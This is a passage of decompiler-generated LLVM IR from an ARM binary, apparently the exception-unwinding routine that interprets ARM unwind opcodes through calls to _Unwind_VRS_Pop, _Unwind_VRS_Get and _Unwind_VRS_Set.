  %v0_193e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_193e8 = udiv i32 %v0_193e8, 16777216
  br label %dec_label_pc_193ec

dec_label_pc_193ec:                               ; preds = %dec_label_pc_193ac, %dec_label_pc_193dc
  %storemerge133 = phi i32 [ %v3_193e8, %dec_label_pc_193dc ], [ 176, %dec_label_pc_193ac ]
  %v1_193ec = load i32, i32* %ip.global-to-local, align 4
  %v4_193ec = mul i32 %v1_193ec, 256
  %v5_193ec = or i32 %v4_193ec, %storemerge133
  store i32 %v5_193ec, i32* %r2.global-to-local, align 4
  %v7_193f0 = icmp eq i32 %v5_193ec, 32768
  store i1 %v7_193f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_193f0, label %dec_label_pc_195fc, label %dec_label_pc_193f8

dec_label_pc_193f8:                               ; preds = %dec_label_pc_193ec
  %v3_193f8 = mul i32 %v5_193ec, 16
  store i32 %v3_193f8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_19408 = and i32 %v3_193f8, 65520
  store i32 %v3_19408, i32* %r2.global-to-local, align 4
  %v0_1940c = load i32, i32* @r7, align 4
  store i32 %v0_1940c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_19414 = call i32 @_Unwind_VRS_Pop(i32 %v0_1940c, i32 %v3_19408, i32 0, i32 0)
  store i32 %v4_19414, i32* %r0.global-to-local, align 4
  %v2_19418 = icmp eq i32 %v4_19414, 0
  store i1 %v2_19418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19418, label %dec_label_pc_19420, label %dec_label_pc_195fc

dec_label_pc_19420:                               ; preds = %dec_label_pc_193f8
  %v0_19420 = load i32, i32* @r5, align 4
  %v1_19420 = add i32 %v0_19420, 8
  %v2_19420 = inttoptr i32 %v1_19420 to i8*
  %v3_19420 = load i8, i8* %v2_19420, align 1
  %v4_19420 = zext i8 %v3_19420 to i32
  store i32 %v4_19420, i32* %r3.global-to-local, align 4
  %v0_19424 = load i32, i32* @r4, align 4
  %v1_19424 = and i32 %v0_19424, 32768
  %v2_19424 = icmp eq i32 %v1_19424, 0
  store i1 %v2_19424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19424, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_19420
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_19420, %bb147
  %v2_1942c = icmp eq i8 %v3_19420, 0
  store i1 %v2_1942c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1942c, label %dec_label_pc_1943c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_19430 = add nsw i32 %v4_19420, -1
  store i32 %v2_19430, i32* %r3.global-to-local, align 4
  %v2_19434 = trunc i32 %v2_19430 to i8
  store i8 %v2_19434, i8* %v2_19420, align 1
  %v0_19438.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19438.pr.pr, label %.thread6.dec_label_pc_1943c_crit_edge, label %dec_label_pc_19368

.thread6.dec_label_pc_1943c_crit_edge:            ; preds = %.thread6
  %v0_1943c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1943c

dec_label_pc_1943c:                               ; preds = %bb148, %.thread6.dec_label_pc_1943c_crit_edge
  %v0_1943c = phi i32 [ %v0_1943c.pre, %.thread6.dec_label_pc_1943c_crit_edge ], [ %v0_19420, %bb148 ]
  %v1_1943c = add i32 %v0_1943c, 9
  %v2_1943c = inttoptr i32 %v1_1943c to i8*
  %v3_1943c = load i8, i8* %v2_1943c, align 1
  %v4_1943c = zext i8 %v3_1943c to i32
  store i32 %v4_1943c, i32* %r3.global-to-local, align 4
  %v2_19440 = icmp eq i8 %v3_1943c, 0
  store i1 %v2_19440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19440, label %dec_label_pc_19448, label %dec_label_pc_1934c

dec_label_pc_19448:                               ; preds = %dec_label_pc_1943c, %dec_label_pc_19340, %dec_label_pc_19368
  %v0_19448 = load i32, i32* @sl, align 4
  %v2_19448 = icmp eq i32 %v0_19448, 0
  store i1 %v2_19448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19448, label %dec_label_pc_19510, label %bb149

bb149:                                            ; preds = %dec_label_pc_19448
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_19454:                               ; preds = %bb149, %dec_label_pc_199c4, %dec_label_pc_19864, %dec_label_pc_19688, %dec_label_pc_19640, %dec_label_pc_195fc, %dec_label_pc_19510
  %v1_1945c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_199c4 ], [ 9, %dec_label_pc_19864 ], [ 9, %dec_label_pc_19688 ], [ 9, %dec_label_pc_19640 ], [ 9, %dec_label_pc_195fc ], [ %v0_19544, %dec_label_pc_19510 ]
  store i32 %v9_19318, i32* %r6.global-to-local, align 4
  store i32 %v21_19318, i32* @lr, align 4
  ret i32 %v1_1945c

dec_label_pc_19460:                               ; preds = %dec_label_pc_19384
  %v1_19460 = mul i32 %v0_19384, 4
  %v3_19464 = and i32 %v1_19460, 252
  store i32 %v3_19464, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19470 = load i32, i32* @r7, align 4
  store i32 %v0_19470, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_19478 = add nuw nsw i32 %v3_19464, 4
  store i32 %v1_19478, i32* %r6.global-to-local, align 4
  %v5_19480 = call i32 @_Unwind_VRS_Get(i32 %v0_19470, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19484 = load i32, i32* @r4, align 4
  %v1_19484 = and i32 %v0_19484, 64
  %v2_19484 = icmp eq i32 %v1_19484, 0
  store i1 %v2_19484, i1* %cpsr_z.global-to-local, align 1
  %v4_1948c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_19498 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_19498
  %storemerge160.p = select i1 %v2_19484, i32 %v2_19498, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1948c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_194b4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_194b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1932c.backedge

dec_label_pc_1932c.backedge:                      ; preds = %dec_label_pc_19460, %dec_label_pc_194dc, %dec_label_pc_19960, %dec_label_pc_1962c, %dec_label_pc_19664, %dec_label_pc_195e4, %dec_label_pc_19850
  %v0_1932c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1932c

dec_label_pc_194bc:                               ; preds = %dec_label_pc_1938c
  %v7_194bc = icmp eq i32 %v1_1938c, 144
  store i1 %v7_194bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_194bc, label %dec_label_pc_194c4, label %dec_label_pc_19604

dec_label_pc_194c4:                               ; preds = %dec_label_pc_194bc
  %v1_194c4 = urem i32 %v0_19384, 16
  store i32 %v1_194c4, i32* %r2.global-to-local, align 4
  %v2_194c8 = icmp eq i32 %v1_194c4, 15
  store i1 %v2_194c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194c8, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_194c4
  %v8_194cc = icmp eq i32 %v1_194c4, 13
  store i1 %v8_194cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_194cc, label %bb154, label %dec_label_pc_194dc

.thread21:                                        ; preds = %dec_label_pc_194c4
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_195fc

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_195fc

dec_label_pc_194dc:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_194e8 = load i32, i32* @r7, align 4
  store i32 %v0_194e8, i32* %r0.global-to-local, align 4
  %v5_194f0 = call i32 @_Unwind_VRS_Get(i32 %v0_194e8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_194f8 = load i32, i32* @r7, align 4
  store i32 %v0_194f8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_19508 = call i32 @_Unwind_VRS_Set(i32 %v0_194f8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19508, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1932c.backedge

dec_label_pc_19510:                               ; preds = %dec_label_pc_19448
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19520 = load i32, i32* @r7, align 4
  store i32 %v0_19520, i32* %r0.global-to-local, align 4
  %v7_19528 = call i32 @_Unwind_VRS_Get(i32 %v0_19520, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1952c = load i32, i32* @r7, align 4
  store i32 %v0_1952c, i32* %r0.global-to-local, align 4
  %v0_19530 = load i32, i32* @sl, align 4
  store i32 %v0_19530, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_19530, i32* %r3.global-to-local, align 4
  %v5_19540 = call i32 @_Unwind_VRS_Set(i32 %v0_1952c, i32 %v0_19530, i32 15, i32 %v0_19530, i8* bitcast (i32* @0 to i8*))
  %v0_19544 = load i32, i32* @sl, align 4
  store i32 %v0_19544, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_1954c:                               ; preds = %dec_label_pc_19740
  %v7_1954c = icmp eq i32 %v0_19740, 199
  store i1 %v7_1954c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1954c, label %dec_label_pc_19820, label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %dec_label_pc_1954c
  %v1_19554 = and i32 %v0_19384, 248
  store i32 %v1_19554, i32* %r3.global-to-local, align 4
  %v7_19558 = icmp eq i32 %v1_19554, 192
  store i1 %v7_19558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19558, label %.thread24, label %dec_label_pc_19570

.thread24:                                        ; preds = %dec_label_pc_19554
  %v2_1955c = urem i32 %v0_19384, 16
  %v2_19560 = add nuw nsw i32 %v2_1955c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19568 = or i32 %v2_19560, 655360
  store i32 %v2_19568, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_19570:                               ; preds = %dec_label_pc_19554
  %v7_19570 = icmp eq i32 %v0_19740, 200
  store i1 %v7_19570, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19570, label %dec_label_pc_197b4, label %dec_label_pc_19578

dec_label_pc_19578:                               ; preds = %dec_label_pc_19570
  %v7_19578 = icmp eq i32 %v0_19740, 201
  store i1 %v7_19578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19578, label %dec_label_pc_19580, label %dec_label_pc_195fc

dec_label_pc_19580:                               ; preds = %dec_label_pc_19578
  %v0_19580 = load i32, i32* @r5, align 4
  %v1_19580 = add i32 %v0_19580, 8
  %v2_19580 = inttoptr i32 %v1_19580 to i8*
  %v3_19580 = load i8, i8* %v2_19580, align 1
  %v4_19580 = zext i8 %v3_19580 to i32
  store i32 %v4_19580, i32* %r3.global-to-local, align 4
  %v2_19584 = icmp eq i8 %v3_19580, 0
  store i1 %v2_19584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19584, label %dec_label_pc_19594, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_19580
  %v2_19588 = add nsw i32 %v4_19580, -1
  store i32 %v2_19588, i32* %r3.global-to-local, align 4
  %v2_1958c = trunc i32 %v2_19588 to i8
  store i8 %v2_1958c, i8* %v2_19580, align 1
  %v0_19590.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19590.pr.pr, label %.thread26.dec_label_pc_19594_crit_edge, label %dec_label_pc_195c8

.thread26.dec_label_pc_19594_crit_edge:           ; preds = %.thread26
  %v0_19594.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19594

dec_label_pc_19594:                               ; preds = %.thread26.dec_label_pc_19594_crit_edge, %dec_label_pc_19580
  %v2_195ac = phi i32 [ %v0_19594.pre, %.thread26.dec_label_pc_19594_crit_edge ], [ %v0_19580, %dec_label_pc_19580 ]
  %v1_19594 = add i32 %v2_195ac, 9
  %v2_19594 = inttoptr i32 %v1_19594 to i8*
  %v3_19594 = load i8, i8* %v2_19594, align 1
  %v4_19594 = zext i8 %v3_19594 to i32
  store i32 %v4_19594, i32* %r3.global-to-local, align 4
  %v2_19598 = icmp eq i8 %v3_19594, 0
  store i1 %v2_19598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19598, label %dec_label_pc_195e4, label %dec_label_pc_195a8

dec_label_pc_195a8:                               ; preds = %dec_label_pc_19594
  %v1_195a8 = add nsw i32 %v4_19594, -1
  store i32 %v1_195a8, i32* %r3.global-to-local, align 4
  %v1_195ac = trunc i32 %v1_195a8 to i8
  store i8 %v1_195ac, i8* %v2_19594, align 1
  %v0_195b0 = load i32, i32* @r5, align 4
  %v1_195b0 = add i32 %v0_195b0, 4
  %v2_195b0 = inttoptr i32 %v1_195b0 to i32*
  %v3_195b0 = load i32, i32* %v2_195b0, align 4
  store i32 %v3_195b0, i32* %r2.global-to-local, align 4
  %v1_195b4 = inttoptr i32 %v3_195b0 to i32*
  %v2_195b4 = load i32, i32* %v1_195b4, align 4
  store i32 %v2_195b4, i32* %r0.global-to-local, align 4
  %v4_195b4 = add i32 %v3_195b0, 4
  store i32 %v4_195b4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_195b4, i32* %v2_195b0, align 4
  %v0_195c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_195c0 = trunc i32 %v0_195c0 to i8
  %v2_195c0 = load i32, i32* @r5, align 4
  %v3_195c0 = add i32 %v2_195c0, 8
  %v4_195c0 = inttoptr i32 %v3_195c0 to i8*
  store i8 %v1_195c0, i8* %v4_195c0, align 1
  %v0_195c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_195c4 = load i32, i32* @r5, align 4
  %v2_195c4 = inttoptr i32 %v1_195c4 to i32*
  store i32 %v0_195c4, i32* %v2_195c4, align 4
  br label %dec_label_pc_195c8

dec_label_pc_195c8:                               ; preds = %.thread26, %dec_label_pc_195a8
  %v0_195c8 = load i32, i32* %r0.global-to-local, align 4
  %v3_195c8 = udiv i32 %v0_195c8, 16777216
  %v1_195cc = urem i32 %v3_195c8, 16
  %v3_195d0 = mul i32 %v0_195c8, 256
  %v1_195d4 = add nuw nsw i32 %v1_195cc, 1
  store i32 %v1_195d4, i32* %r1.global-to-local, align 4
  %v1_195d8 = and i32 %v3_195c8, 240
  store i32 %v1_195d8, i32* %r3.global-to-local, align 4
  %v1_195dc = load i32, i32* @r5, align 4
  %v2_195dc = inttoptr i32 %v1_195dc to i32*
  store i32 %v3_195d0, i32* %v2_195dc, align 4
  %v0_195e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_195e0 = load i32, i32* %r3.global-to-local, align 4
  %v4_195e0 = mul i32 %v1_195e0, 4096
  %v5_195e0 = or i32 %v4_195e0, %v0_195e0
  br label %dec_label_pc_195e4

dec_label_pc_195e4:                               ; preds = %dec_label_pc_19594, %dec_label_pc_195c8
  %storemerge = phi i32 [ %v5_195e0, %dec_label_pc_195c8 ], [ 720897, %dec_label_pc_19594 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_195e4 = load i32, i32* @r7, align 4
  store i32 %v0_195e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_195f0 = call i32 @_Unwind_VRS_Pop(i32 %v0_195e4, i32 1, i32 5, i32 5)
  store i32 %v4_195f0, i32* %r0.global-to-local, align 4
  %v2_195f4 = icmp eq i32 %v4_195f0, 0
  store i1 %v2_195f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195f4, label %dec_label_pc_1932c.backedge, label %dec_label_pc_195fc

dec_label_pc_195fc:                               ; preds = %dec_label_pc_19848, %dec_label_pc_19578, %dec_label_pc_19658, %dec_label_pc_199fc, %dec_label_pc_199cc, %dec_label_pc_199a8, %dec_label_pc_19834, %dec_label_pc_195e4, %dec_label_pc_193f8, %dec_label_pc_193ec, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_19604:                               ; preds = %dec_label_pc_194bc
  %v7_19604 = icmp eq i32 %v1_1938c, 160
  store i1 %v7_19604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19604, label %dec_label_pc_1960c, label %dec_label_pc_19648

dec_label_pc_1960c:                               ; preds = %dec_label_pc_19604
  %v0_1960c = load i32, i32* %ip.global-to-local, align 4
  %v1_1960c = urem i32 %v0_1960c, 8
  %v1_19610 = xor i32 %v1_1960c, 7
  store i32 %v1_19610, i32* %r3.global-to-local, align 4
  %v6_19618 = lshr i32 4080, %v1_19610
  %v1_1961c = and i32 %v0_19384, 8
  %v2_1961c = icmp eq i32 %v1_1961c, 0
  store i1 %v2_1961c, i1* %cpsr_z.global-to-local, align 1
  %v1_19620 = and i32 %v6_19618, 4080
  %tmp155 = mul nuw nsw i32 %v1_1961c, 2048
  %tmp156 = or i32 %v1_19620, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_1962c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_199bc.dec_label_pc_1962c_crit_edge, %bb157, %dec_label_pc_19818, %dec_label_pc_197ac, %dec_label_pc_1970c, %dec_label_pc_1960c
  %v2_19634 = phi i32 [ %v2_19730, %.thread44 ], [ %v2_19738, %bb157 ], [ %v2_19634.pre, %dec_label_pc_199bc.dec_label_pc_1962c_crit_edge ], [ %v2_19568, %.thread24 ], [ %storemerge130, %dec_label_pc_19818 ], [ %storemerge131, %dec_label_pc_197ac ], [ %storemerge132, %dec_label_pc_1970c ], [ %tmp156, %dec_label_pc_1960c ]
  %v0_19630 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_199bc.dec_label_pc_1962c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_19818 ], [ 3, %dec_label_pc_197ac ], [ 1, %dec_label_pc_1970c ], [ 0, %dec_label_pc_1960c ]
  %v0_1962c = load i32, i32* @r7, align 4
  store i32 %v0_1962c, i32* %r0.global-to-local, align 4
  store i32 %v0_19630, i32* %r3.global-to-local, align 4
  %v4_19634 = call i32 @_Unwind_VRS_Pop(i32 %v0_1962c, i32 %v0_19630, i32 %v2_19634, i32 %v0_19630)
  store i32 %v4_19634, i32* %r0.global-to-local, align 4
  %v2_19638 = icmp eq i32 %v4_19634, 0
  store i1 %v2_19638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19638, label %dec_label_pc_1932c.backedge, label %dec_label_pc_19640

dec_label_pc_19640:                               ; preds = %dec_label_pc_1962c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_19648:                               ; preds = %dec_label_pc_19604
  %v7_19648 = icmp eq i32 %v1_1938c, 176
  store i1 %v7_19648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19648, label %dec_label_pc_19690, label %dec_label_pc_19650

dec_label_pc_19650:                               ; preds = %dec_label_pc_19648
  %v7_19650 = icmp eq i32 %v1_1938c, 192
  store i1 %v7_19650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19650, label %dec_label_pc_19740, label %dec_label_pc_19658

dec_label_pc_19658:                               ; preds = %dec_label_pc_19650
  %v1_19658 = and i32 %v0_19384, 248
  store i32 %v1_19658, i32* %r3.global-to-local, align 4
  %v7_1965c = icmp eq i32 %v1_19658, 208
  store i1 %v7_1965c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1965c, label %dec_label_pc_19664, label %dec_label_pc_195fc

dec_label_pc_19664:                               ; preds = %dec_label_pc_19658
  %v1_19664 = urem i32 %v0_19384, 8
  %v1_19668 = add nuw nsw i32 %v1_19664, 1
  %v1_1966c = or i32 %v1_19668, 524288
  store i32 %v1_1966c, i32* %r2.global-to-local, align 4
  %v0_19670 = load i32, i32* @r7, align 4
  store i32 %v0_19670, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1967c = call i32 @_Unwind_VRS_Pop(i32 %v0_19670, i32 1, i32 %v1_1966c, i32 5)
  store i32 %v4_1967c, i32* %r0.global-to-local, align 4
  %v2_19680 = icmp eq i32 %v4_1967c, 0
  store i1 %v2_19680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19680, label %dec_label_pc_1932c.backedge, label %dec_label_pc_19688

dec_label_pc_19688:                               ; preds = %dec_label_pc_19664
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19454

dec_label_pc_19690:                               ; preds = %dec_label_pc_19648
  %v0_19690 = load i32, i32* %ip.global-to-local, align 4
  %v7_19690 = icmp eq i32 %v0_19690, 177
  store i1 %v7_19690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19690, label %dec_label_pc_19994, label %dec_label_pc_19698

dec_label_pc_19698:                               ; preds = %dec_label_pc_19690
  %v7_19698 = icmp eq i32 %v0_19690, 178
  store i1 %v7_19698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19698, label %dec_label_pc_1986c, label %dec_label_pc_196a0

dec_label_pc_196a0:                               ; preds = %dec_label_pc_19698
  %v7_196a0 = icmp eq i32 %v0_19690, 179
  store i1 %v7_196a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196a0, label %dec_label_pc_196a8, label %dec_label_pc_19714

dec_label_pc_196a8:                               ; preds = %dec_label_pc_196a0
  %v0_196a8 = load i32, i32* @r5, align 4
  %v1_196a8 = add i32 %v0_196a8, 8
  %v2_196a8 = inttoptr i32 %v1_196a8 to i8*
  %v3_196a8 = load i8, i8* %v2_196a8, align 1
  %v4_196a8 = zext i8 %v3_196a8 to i32
  store i32 %v4_196a8, i32* %r3.global-to-local, align 4
  %v2_196ac = icmp eq i8 %v3_196a8, 0
  store i1 %v2_196ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196ac, label %dec_label_pc_196bc, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_196a8
  %v2_196b0 = add nsw i32 %v4_196a8, -1
  store i32 %v2_196b0, i32* %r3.global-to-local, align 4
  %v2_196b4 = trunc i32 %v2_196b0 to i8
  store i8 %v2_196b4, i8* %v2_196a8, align 1
  %v0_196b8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_196b8.pr.pr, label %.thread30.dec_label_pc_196bc_crit_edge, label %dec_label_pc_196f0

.thread30.dec_label_pc_196bc_crit_edge:           ; preds = %.thread30
  %v0_196bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_196bc

dec_label_pc_196bc:                               ; preds = %.thread30.dec_label_pc_196bc_crit_edge, %dec_label_pc_196a8
  %v2_196d4 = phi i32 [ %v0_196bc.pre, %.thread30.dec_label_pc_196bc_crit_edge ], [ %v0_196a8, %dec_label_pc_196a8 ]
  %v1_196bc = add i32 %v2_196d4, 9
  %v2_196bc = inttoptr i32 %v1_196bc to i8*
  %v3_196bc = load i8, i8* %v2_196bc, align 1
  %v4_196bc = zext i8 %v3_196bc to i32
  store i32 %v4_196bc, i32* %r3.global-to-local, align 4
  %v2_196c0 = icmp eq i8 %v3_196bc, 0
  store i1 %v2_196c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196c0, label %dec_label_pc_1970c, label %dec_label_pc_196d0

dec_label_pc_196d0:                               ; preds = %dec_label_pc_196bc
  %v1_196d0 = add nsw i32 %v4_196bc, -1
  store i32 %v1_196d0, i32* %r3.global-to-local, align 4
  %v1_196d4 = trunc i32 %v1_196d0 to i8
  store i8 %v1_196d4, i8* %v2_196bc, align 1
  %v0_196d8 = load i32, i32* @r5, align 4
  %v1_196d8 = add i32 %v0_196d8, 4
  %v2_196d8 = inttoptr i32 %v1_196d8 to i32*
  %v3_196d8 = load i32, i32* %v2_196d8, align 4
  store i32 %v3_196d8, i32* %r2.global-to-local, align 4
  %v1_196dc = inttoptr i32 %v3_196d8 to i32*
  %v2_196dc = load i32, i32* %v1_196dc, align 4
  store i32 %v2_196dc, i32* %r0.global-to-local, align 4
  %v4_196dc = add i32 %v3_196d8, 4
  store i32 %v4_196dc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_196dc, i32* %v2_196d8, align 4
  %v0_196e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_196e8 = trunc i32 %v0_196e8 to i8
  %v2_196e8 = load i32, i32* @r5, align 4
  %v3_196e8 = add i32 %v2_196e8, 8
  %v4_196e8 = inttoptr i32 %v3_196e8 to i8*
  store i8 %v1_196e8, i8* %v4_196e8, align 1
  %v0_196ec = load i32, i32* %r0.global-to-local, align 4
  %v1_196ec = load i32, i32* @r5, align 4
  %v2_196ec = inttoptr i32 %v1_196ec to i32*
  store i32 %v0_196ec, i32* %v2_196ec, align 4
  br label %dec_label_pc_196f0

dec_label_pc_196f0:                               ; preds = %.thread30, %dec_label_pc_196d0
  %v0_196f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_196f0 = udiv i32 %v0_196f0, 16777216
  %v1_196f4 = urem i32 %v3_196f0, 16
  %v3_196f8 = mul i32 %v0_196f0, 256
  store i32 %v3_196f8, i32* %r0.global-to-local, align 4
  %v1_196fc = add nuw nsw i32 %v1_196f4, 1
  store i32 %v1_196fc, i32* %r2.global-to-local, align 4
  %v1_19700 = and i32 %v3_196f0, 240
  store i32 %v1_19700, i32* %r3.global-to-local, align 4
  %v1_19704 = load i32, i32* @r5, align 4
  %v2_19704 = inttoptr i32 %v1_19704 to i32*
  store i32 %v3_196f8, i32* %v2_19704, align 4
  %v0_19708 = load i32, i32* %r2.global-to-local, align 4
  %v1_19708 = load i32, i32* %r3.global-to-local, align 4
  %v4_19708 = mul i32 %v1_19708, 4096
  %v5_19708 = or i32 %v4_19708, %v0_19708
  br label %dec_label_pc_1970c

dec_label_pc_1970c:                               ; preds = %dec_label_pc_196bc, %dec_label_pc_196f0
  %storemerge132 = phi i32 [ %v5_19708, %dec_label_pc_196f0 ], [ 720897, %dec_label_pc_196bc ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_19714:                               ; preds = %dec_label_pc_196a0
  %v1_19714 = and i32 %v0_19384, 252
  store i32 %v1_19714, i32* %r3.global-to-local, align 4
  %v7_19718 = icmp eq i32 %v1_19714, 180
  store i1 %v7_19718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19718, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_19714
  %v2_1971c = urem i32 %v0_19384, 4
  %v2_19724 = add nuw nsw i32 %v2_1971c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_19730 = or i32 %v2_19724, 262144
  store i32 %v2_19730, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1962c

bb157:                                            ; preds = %dec_label_pc_19714
  %v2_19720 = urem i32 %v0_19690, 8
  %v2_19728 = add nuw nsw i32 %v2_19720, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_19738 = or i32 %v2_19728, 524288
  store i32 %v2_19738, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1962c

dec_label_pc_19740:                               ; preds = %dec_label_pc_19650
  %v0_19740 = load i32, i32* %ip.global-to-local, align 4
  %v7_19740 = icmp eq i32 %v0_19740, 198
  store i1 %v7_19740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19740, label %dec_label_pc_19748, label %dec_label_pc_1954c

dec_label_pc_19748:                               ; preds = %dec_label_pc_19740
  %v0_19748 = load i32, i32* @r5, align 4
  %v1_19748 = add i32 %v0_19748, 8
  %v2_19748 = inttoptr i32 %v1_19748 to i8*
  %v3_19748 = load i8, i8* %v2_19748, align 1
  %v4_19748 = zext i8 %v3_19748 to i32
  store i32 %v4_19748, i32* %r3.global-to-local, align 4
  %v2_1974c = icmp eq i8 %v3_19748, 0
  store i1 %v2_1974c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1974c, label %dec_label_pc_1975c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19748
  %v2_19750 = add nsw i32 %v4_19748, -1
  store i32 %v2_19750, i32* %r3.global-to-local, align 4
  %v2_19754 = trunc i32 %v2_19750 to i8
  store i8 %v2_19754, i8* %v2_19748, align 1
  %v0_19758.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
